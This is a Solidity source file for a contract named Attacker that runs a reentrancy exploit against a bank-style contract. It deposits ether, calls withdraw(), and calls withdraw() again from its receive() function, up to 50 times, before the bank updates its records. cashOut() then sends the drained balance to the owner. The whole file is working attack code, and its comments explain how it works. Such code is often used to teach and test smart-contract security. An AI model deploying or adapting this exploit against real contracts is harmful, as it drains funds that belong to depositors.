// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

// Deposits 1 ether, then keeps calling withdraw() from inside its own receive() function.
contract Attacker {
    IBank public bank;
    address public owner;
    uint256 public reentries;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "only owner");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // Runs every time the bank sends this contract ether.
    receive() external payable {
        if (address(bank).balance >= msg.value && reentries < 50) {
            reentries += 1;
            bank.withdraw();   // re-enter before the bank has updated its books
        }
    }

    function cashOut() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "cash out failed");
    }
}
